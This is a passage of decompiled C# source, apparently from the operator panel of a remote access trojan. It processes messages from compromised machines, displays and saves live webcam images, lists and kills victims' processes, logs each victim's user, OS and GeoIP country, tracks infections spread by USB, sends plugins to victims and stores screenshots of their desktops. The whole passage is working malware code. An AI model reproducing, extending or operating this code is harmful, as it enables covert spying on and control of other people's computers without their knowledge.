									client.L = new ListViewItem();
								}
								FrmCam frmCam = (FrmCam)ima.Gform("cam" + client.ip());
								string left19 = array2[2];
								if (Operators.CompareString(left19, "~", false) == 0)
								{
									if (frmCam == null)
									{
										if (ima.F.InvokeRequired)
										{
											ima.F.Invoke(new ima._Req(ima.Req), new object[]
											{
												RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
											});
										}
										else
										{
											frmCam = new FrmCam();
											frmCam.sk = client;
											frmCam.osk = ima.W.GetClient(array2[1]);
											frmCam.Name = "cam" + client.ip();
											int num27 = array2.Length - 1;
											for (int num28 = 3; num28 <= num27; num28++)
											{
												frmCam.ComboBox1.SelectedIndex = frmCam.ComboBox1.Items.Add(array2[num28]);
											}
											frmCam.Show();
										}
									}
									else
									{
										int num29 = array2.Length - 1;
										for (int num30 = 3; num30 <= num29; num30++)
										{
											frmCam.ComboBox1.SelectedIndex = frmCam.ComboBox1.Items.Add(array2[num30]);
										}
									}
								}
								else if (Operators.CompareString(left19, "!", false) == 0)
								{
									if (Operators.CompareString(array2[3], "!", false) != 0)
									{
										Image image = Image.FromStream(new MemoryStream(Convert.FromBase64String(array2[3])));
										FrmCam frmCam2 = frmCam;
										frmCam2.fps++;
										frmCam.pkt = array2[3].Length;
										if (frmCam.CheckBox3.Checked)
										{
											new Random();
											try
											{
												image.Save(frmCam.folder + Fungsi.DT() + ".jpg");
											}
											catch (Exception expr_4584)
											{
												ProjectData.SetProjectError(expr_4584);
												Exception projectError2 = expr_4584;
												ProjectData.SetProjectError(projectError2);
												ProjectData.ClearProjectError();
												ProjectData.ClearProjectError();
											}
										}
										frmCam.PictureBox1.Image = image;
									}
									if (Operators.CompareString(frmCam.Button1.Text, "Stop", false) == 0)
									{
										NewLateBinding.LateCall(client, null, "Send", new object[]
										{
											RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + ima.Y + Conversions.ToString(frmCam.ComboBox1.SelectedIndex) + ima.Y, RuntimeHelpers.GetObjectValue(frmCam.ComboBox2.SelectedItem)))
										}, null, null, null, true);
									}
									else
									{
										client.Send("@");
									}
								}
							}
							else if (Operators.CompareString(text, "proc", false) == 0)
							{
								if (client.L == null)
								{
									client.L = new ListViewItem();
								}
								FrmProcess frmProcess = (FrmProcess)ima.Gform("proc" + client.ip());
								if (frmProcess == null)
								{
									if (ima.F.InvokeRequired)
									{
										ima.F.Invoke(new ima._Req(ima.Req), new object[]
										{
											RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))
										});
										return;
									}
									frmProcess = new FrmProcess();
									frmProcess.sk = client;
									frmProcess.osk = ima.W.GetClient(array2[1]);
									frmProcess.Name = "proc" + client.ip();
									frmProcess.Show();
								}
								if (array2.Length > 2)
								{
									string left20 = array2[2];
									if (Operators.CompareString(left20, "pid", false) == 0)
									{
										frmProcess.ID = Conversions.ToInteger(array2[3]);
									}
									else if (Operators.CompareString(left20, "~", false) == 0)
									{
										frmProcess.L1.Items.Clear();
										frmProcess.pr.Value = 0;
										frmProcess.pr.Maximum = Conversions.ToInteger(array2[3]);
									}
									else if (Operators.CompareString(left20, "!", false) == 0)
									{
										int num31 = array2.Length - 1;
										int num32 = 3;
										while (num32 <= num31)
										{
											try
											{
												frmProcess.SL.Text = "Process : " + Conversions.ToString(frmProcess.L1.Items.Count);
												try
												{
													CHProgressbar pr16 = frmProcess.pr;
													pr16.Value++;
												}
												catch (Exception expr_47FB)
												{
													ProjectData.SetProjectError(expr_47FB);
													ProjectData.ClearProjectError();
												}
												string[] array49 = Strings.Split(array2[num32], ",", -1, CompareMethod.Binary);
												ListViewItem listViewItem29 = frmProcess.L1.Items.Add(array49[1].ToString(), Strings.Split(array49[0], "\\", -1, CompareMethod.Binary)[Strings.Split(array49[0], "\\", -1, CompareMethod.Binary).Length - 1], 0);
												listViewItem29.SubItems.Add(array49[1]);
												if (Conversions.ToDouble(array49[1]) == (double)frmProcess.ID)
												{
													listViewItem29.ForeColor = Color.Red;
												}
												if (array49[0].Contains(":\\"))
												{
													listViewItem29.SubItems.Add(array49[0]);
												}
												else
												{
													listViewItem29.SubItems.Add("");
												}
												num32++;
											}
											catch (Exception expr_48CC)
											{
												ProjectData.SetProjectError(expr_48CC);
												ProjectData.ClearProjectError();
											}
										}
										frmProcess.L1.FX();
									}
									else if (Operators.CompareString(left20, "RM", false) == 0)
									{
										frmProcess.SL.Text = frmProcess.L1.Items[array2[3]].Text + "[" + array2[3] + "] Killed";
										frmProcess.L1.Items[array2[3]].Remove();
									}
									else if (Operators.CompareString(left20, "ER", false) == 0)
									{
										frmProcess.SL.Text = string.Concat(new string[]
										{
											"ERROR AT [",
											array2[3],
											"] MSG [",
											array2[4],
											"]"
										});
										if (ima.F.SLGS2.Checked)
										{
											ima.F.Pp1.WRT(new object[]
											{
												Color.WhiteSmoke,
												Fungsi.HM(),
												"ERROR AT",
												array2[3],
												Color.Red,
												array2[4]
											});
										}
									}
								}
							}
							else if (Operators.CompareString(text, "lv", false) == 0)
							{
								ListView.ListViewItemCollection items2 = ima.F.L1.Items;
								lock (items2)
								{
									try
									{
										if (client.L != null)
										{
											client.L.Remove();
										}
										ima.F.L1.SuspendLayout();
										client.L = ima.F.L1.Items.Add(client.ip(), Fungsi.DEB(ref array2[1]), 0);
										client.L.ToolTipText = client.ip();
										client.L.Tag = client;
										client.L.SubItems.Add(Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)[0]);
										client.Folder = Application.StartupPath + "\\Users\\";
										int num33 = array2.Length - 2;
										int num34 = 2;
										string iPA2 = Strings.Split(client.ip(), ":", -1, CompareMethod.Binary)[0];
										while (2 <= num33)
										{
											int num35 = num34;
											if (num35 == ima.hac)
											{
												client.L.SubItems.Add(Fungsi.DEB(ref array2[num34]));
											}
											else if (num35 == ima.hpc)
											{
												client.L.SubItems.Add(Fungsi.Siz(Conversions.ToLong(array2[num34])));
											}
											else if (num35 == ima.hfld)
											{
												string text17 = array2[num34];
												client.L.UseItemStyleForSubItems = false;
												if (Conversions.ToDouble(text17) == 0.0)
												{
													client.L.SubItems.Add("Not Found").ForeColor = Color.Red;
												}
												else
												{
													client.L.SubItems.Add(text17 + " Plugin(s)").ForeColor = ((Conversions.ToDouble(text17) != 10.0) ? ((Conversions.ToDouble(text17) < 5.0) ? ((Conversions.ToDouble(text17) < 1.0) ? Color.Red : Color.Orange) : Color.GreenYellow) : Color.LimeGreen);
												}
											}
											else if (num35 == ima.hco)
											{
												if (ima.F.L1.SmallImageList == ima.F.ImageList1)
												{
													client.L.ImageKey = ima.GeoIP.LookupCountryCode(iPA2) + ".png";
												}
												client.L.SubItems.Add(ima.GeoIP.LookupCountryCode(iPA2));
												ima.co = ima.co + ima.GeoIP.LookupCountryCode(iPA2) + "|";
											}
											else
											{
												client.L.SubItems.Add(array2[num34]);
											}
											num34++;
										}
										if (ima.F.sthmb1.Checked)
										{
											ima.map = true;
										}
										ima.F.L1.ResumeLayout();
										client.plg.AddRange(Strings.Split(array2[array2.Length - 1], ",", -1, CompareMethod.Binary));
									}
									catch (Exception expr_4D42)
									{
										ProjectData.SetProjectError(expr_4D42);
										ProjectData.ClearProjectError();
									}
								}
								try
								{
									client.pc = (Bitmap)Image.FromStream(new MemoryStream(File.ReadAllBytes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(client.Folder, ima.vno(client.L)), "\\"), "Thumbnail.jpg")))));
								}
								catch (Exception expr_4DA4)
								{
									ProjectData.SetProjectError(expr_4DA4);
									Exception projectError3 = expr_4DA4;
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
									ProjectData.ClearProjectError();
								}
								if (ima.F.L1.Items.Count < 10)
								{
									ima.F.L1.FX();
								}
								if (ima.F.Snotif.Checked && MyProject.Application.OpenForms.Count < 10)
								{
									ima.F.Invoke(new ima._shw(ima.shw), new object[]
									{
										client
									});
								}
								if (ima.F.Snotif2.Checked)
								{
									try
									{
										MyProject.Computer.Audio.Play(Resources.Sound, AudioPlayMode.Background);
									}
									catch (Exception expr_4E5A)
									{
										ProjectData.SetProjectError(expr_4E5A);
										ProjectData.ClearProjectError();
									}
								}
								if (ima.F.SLGS1.Checked)
								{
									ima.F.Pp1.WRT(new object[]
									{
										Color.WhiteSmoke,
										Fungsi.HM(),
										ima.F.ImageList1.Images[client.L.SubItems[ima.hco].Text + ".png"],
										client.ip(),
										RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ima.vno(client.L)))),
										Color.YellowGreen,
										"",
										"Ready"
									});
								}
								if (ima.ensr)
								{
									ima.F.L1.EnsureVisible(ima.F.L1.Items.Count - 1);
								}
							}
							else
							{
								if (Operators.CompareString(text, "P", false) == 0)
								{
									if (client.L == null || client.L.SubItems.Count <= ima.hping)
									{
										goto IL_57A7;
									}
									ListView.ListViewItemCollection items3 = ima.F.L1.Items;
									int num36 = Conversions.ToInteger(array2[1]);
									ListView.ListViewItemCollection obj12 = items3;
									lock (obj12)
									{
										client.L.UseItemStyleForSubItems = false;
										client.L.SubItems[ima.hping].ForeColor = ((num36 != 999) ? ((num36 < 500) ? ((num36 < 250) ? Color.LimeGreen : Color.LightGreen) : Color.GreenYellow) : Color.Orange);
										client.L.SubItems[ima.hping].Text = array2[1] + "ms";
										return;
									}
								}
								if (Operators.CompareString(text, "bla", false) == 0)
								{
									if (client.IsUSB)
									{
										client.L.ForeColor = Color.Blue;
									}
									else
									{
										client.L.ForeColor = Color.WhiteSmoke;
									}
								}
								else if (Operators.CompareString(text, "~", false) == 0)
								{
									client.Send("~");
								}
								else if (Operators.CompareString(text, "MSG", false) == 0)
								{
									if (ima.F.SLGS2.Checked)
									{
										ima.F.Pp1.WRT(new object[]
										{
											Color.WhiteSmoke,
											Fungsi.HM(),
											ima.F.ImageList1.Images[client.L.SubItems[ima.hco].Text + ".png"],
											client.ip(),
											RuntimeHelpers.GetObjectValue(ima.vno(client.L)),
											"\r\n",
											"",
											Color.RoyalBlue,
											array2[1]
										});
									}
								}
								else if (Operators.CompareString(text, "ER", false) == 0)
								{
									if (ima.F.SLGS2.Checked)
									{
										ima.F.Pp1.WRT(new object[]
										{
											Color.WhiteSmoke,
											Fungsi.HM(),
											ima.F.ImageList1.Images[client.L.SubItems[ima.hco].Text + ".png"],
											client.ip(),
											RuntimeHelpers.GetObjectValue(ima.vno(client.L)),
											"\r\n",
											"",
											Color.Red,
											array2[1],
											array2[2]
										});
									}
								}
								else
								{
									if (Operators.CompareString(text, "!", false) == 0)
									{
										if (client == null)
										{
											goto IL_57A7;
										}
										List<Client> iSAd = ima.ISAd;
										List<Client> obj13 = iSAd;
										lock (obj13)
										{
											client.Isend = false;
											if (ima.ISAd.Contains(client))
											{
												ima.ISAd.Remove(client);
											}
										}
										if (client.IsUSB)
										{
											List<Client> list7 = ima.usb;
											List<Client> obj14 = list7;
											lock (obj14)
											{
												ima.usb.Remove(client);
											}
										}
										if (client.pc != null)
										{
											client.pc.Dispose();
											client.pc = null;
										}
										client.snf = null;
										client.plg.Clear();
										if (client.L != null)
										{
											ListView.ListViewItemCollection items4 = ima.F.L1.Items;
											ListView.ListViewItemCollection obj15 = items4;
											lock (obj15)
											{
												ima.F.L1.Items.Remove(client.L);
											}
										}
										try
										{
											ImageList smallImageList = ima.F.L1.SmallImageList;
											ImageList obj16 = smallImageList;
											lock (obj16)
											{
												ima.F.IMG.Images.RemoveByKey(client.ip());
											}
											goto IL_57A7;
										}
										catch (Exception expr_53ED)
										{
											ProjectData.SetProjectError(expr_53ED);
											Exception projectError4 = expr_53ED;
											ProjectData.SetProjectError(projectError4);
											ProjectData.ClearProjectError();
											ProjectData.ClearProjectError();
											goto IL_57A7;
										}
									}
									if (Operators.CompareString(text, "pl", false) == 0)
									{
										try
										{
											client.plg.Remove(array2[1]);
										}
										catch (Exception expr_5433)
										{
											ProjectData.SetProjectError(expr_5433);
											Exception projectError5 = expr_5433;
											ProjectData.SetProjectError(projectError5);
											ProjectData.ClearProjectError();
											ProjectData.ClearProjectError();
										}
										if (Operators.CompareString(array2[2].ToString(), "0", false) == 0)
										{
											client.plg.Add(array2[1]);
										}
										else
										{
											ima.SendPlug(client, ima.GETPLG(null, array2[1]), Conversions.ToBoolean(array2[2]));
										}
									}
									else
									{
										if (Operators.CompareString(text, "CAP", false) == 0)
										{
											List<Client> iSAd2 = ima.ISAd;
											List<Client> obj17 = iSAd2;
											lock (obj17)
											{
												client.Isend = false;
												if (ima.ISAd.Contains(client))
												{
													ima.ISAd.Remove(client);
												}
											}
											byte[] buffer = (byte[])NewLateBinding.LateIndexGet(Fungsi.fx(array, ima.Y), new object[]
											{
												1
											}, null);
											client.pc = (Bitmap)Image.FromStream(new MemoryStream(buffer)).Clone();
											try
											{
												if (!Directory.Exists(client.Folder))
												{
													Directory.CreateDirectory(client.Folder);
												}
												NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(client.pc.Clone()), null, "Save", new object[]
												{
													Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(client.Folder, ima.vno(client.L)), "\\"), "Thumbnail.jpg")
												}, null, null, null, true);
											}
											catch (Exception expr_55B1)
											{
												ProjectData.SetProjectError(expr_55B1);
												Exception projectError6 = expr_55B1;
												ProjectData.SetProjectError(projectError6);
												ProjectData.ClearProjectError();
												ProjectData.ClearProjectError();
											}
											if (ima.F.CEL == client)
											{
												PictureBox p = ima.F.P1;
												PictureBox obj18 = p;
												lock (obj18)
												{
													ima.F.P1.Image = (Image)client.pc.Clone();
												}
											}
											ImageList smallImageList2 = ima.F.L1.SmallImageList;
											ImageList obj19 = smallImageList2;
											lock (obj19)
											{
												if (!ima.F.IMG.Images.ContainsKey(client.ip()))
												{
													ima.F.IMG.Images.Add(client.ip(), client.pc);
												}
												else
												{
													int index = ima.F.IMG.Images.IndexOfKey(client.ip());
													ima.F.IMG.Images.Add(client.ip(), client.pc);
													ima.F.IMG.Images.RemoveAt(index);
												}
												if (ima.F.L1.SmallImageList == ima.F.IMG)
												{
													client.L.ImageKey = "";
													client.L.ImageKey = client.ip();
												}
												goto IL_57A7;
											}
										}
										if (Operators.CompareString(text, "act", false) == 0)
										{
											ListView.ListViewItemCollection items5 = ima.F.L1.Items;
											ListView.ListViewItemCollection obj20 = items5;
											lock (obj20)
											{
												if (client.L != null)
												{
													client.L.SubItems[ima.hac].Text = Fungsi.DEB(ref array2[1]);
												}
											}
										}
									}
								}
							}
							IL_57A7:;
						}
					}
				}
				catch (Exception expr_57AC)
				{
					ProjectData.SetProjectError(expr_57AC);
					Exception ex = expr_57AC;
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					if (Operators.CompareString(array2[0], "up", false) == 0 | Operators.CompareString(array2[0], "dw", false) == 0)
					{
						try
						{
							client.Send("close" + ima.Y + array2[1]);
						}
						catch (Exception expr_5808)
						{
							ProjectData.SetProjectError(expr_5808);
							Exception projectError7 = expr_5808;
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
					else
					{
						if (Operators.CompareString(array2[0].ToLower(), "cap", false) == 0)
						{
							List<Client> iSAd3 = ima.ISAd;
							List<Client> obj21 = iSAd3;
							lock (obj21)
							{
								client.Isend = false;
								if (ima.ISAd.Contains(client))
								{
									ima.ISAd.Remove(client);
								}
							}
						}
						ima.Log(string.Concat(new string[]
						{
							"Listner Error At[",
							array2[0],
							"] MSG[",
							ex2.Message,
							"]"
						}));
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x06000963 RID: 2403 RVA: 0x000515A4 File Offset: 0x0004F7A4
		public static void shw(Client c)
		{
			ima.notifeshw = false;
			FrmNotification frmNotification = (FrmNotification)ima.Gform("notif" + c.ip());
			frmNotification = new FrmNotification();
			frmNotification.Pp1.wrk();
			frmNotification.Pp1.WRT(new object[]
			{
				ima.F.ImageList1.Images[c.L.SubItems[ima.hco].Text + ".png"],
				Color.RoyalBlue,
				c.L.SubItems[ima.hip].Text,
				"\r\n",
				Color.WhiteSmoke,
				"ID : ",
				Color.Silver,
				c.L.SubItems[ima.hname].Text,
				"\r\n",
				Color.WhiteSmoke,
				"User : ",
				Color.Silver,
				c.L.SubItems[ima.huser].Text,
				Color.WhiteSmoke,
				"\r\n",
				"OS : ",
				Color.Silver,
				c.L.SubItems[ima.hos].Text,
				Color.WhiteSmoke,
				"\r\n",
				"Country : ",
				Color.Silver,
				c.L.SubItems[ima.hco].Text
			});
			Fungsi.ShowWindow(frmNotification.Handle, 8);
			ima.notifeshw = true;
			frmNotification.shw();
		}

		// Token: 0x04000472 RID: 1138
		public static bool ensr;

		// Token: 0x04000473 RID: 1139
		public static Form1 F;

		// Token: 0x04000474 RID: 1140
		public static int hac;

		// Token: 0x04000475 RID: 1141
		public static int hcam;

		// Token: 0x04000476 RID: 1142
		public static int hco;

		// Token: 0x04000477 RID: 1143
		public static int hin;

		// Token: 0x04000478 RID: 1144
		public static int hip;

		// Token: 0x04000479 RID: 1145
		public static int hname;

		// Token: 0x0400047A RID: 1146
		public static int hos;

		// Token: 0x0400047B RID: 1147
		public static int hpc;

		// Token: 0x0400047C RID: 1148
		public static int hping;

		// Token: 0x0400047D RID: 1149
		public static int huser;

		// Token: 0x0400047E RID: 1150
		public static int hvr;

		// Token: 0x0400047F RID: 1151
		public static int hfld;

		// Token: 0x04000480 RID: 1152
		private static List<Client> iNotSad;

		// Token: 0x04000481 RID: 1153
		public static List<Client> ISAd;

		// Token: 0x04000482 RID: 1154
		public static List<string> LG;

		// Token: 0x04000483 RID: 1155
		public static List<plg> Plug;

		// Token: 0x04000484 RID: 1156
		public static int RC;

		// Token: 0x04000485 RID: 1157
		public static int SNT;

		// Token: 0x04000486 RID: 1158
		public static List<Client> usb;

		// Token: 0x04000487 RID: 1159
		public static int SNT2;

		// Token: 0x04000488 RID: 1160
		public static int RC2;

		// Token: 0x04000489 RID: 1161
		public static string vr;

		// Token: 0x0400048A RID: 1162
		public static SocketServer W;

		// Token: 0x0400048B RID: 1163
		public static string Y;

		// Token: 0x0400048C RID: 1164
		public static bool map;

		// Token: 0x0400048D RID: 1165
		public static string co;

		// Token: 0x0400048E RID: 1166
		public static string UPNP;

		// Token: 0x0400048F RID: 1167
		public static Getcountry GeoIP;

		// Token: 0x04000490 RID: 1168
		public static object notifeshw;

		// Token: 0x0200003D RID: 61
		// (Invoke) Token: 0x06000967 RID: 2407
		public delegate void _Req(object obj);

		// Token: 0x0200003E RID: 62
		// (Invoke) Token: 0x0600096B RID: 2411
		public delegate void _shw(Client c);
	}
}
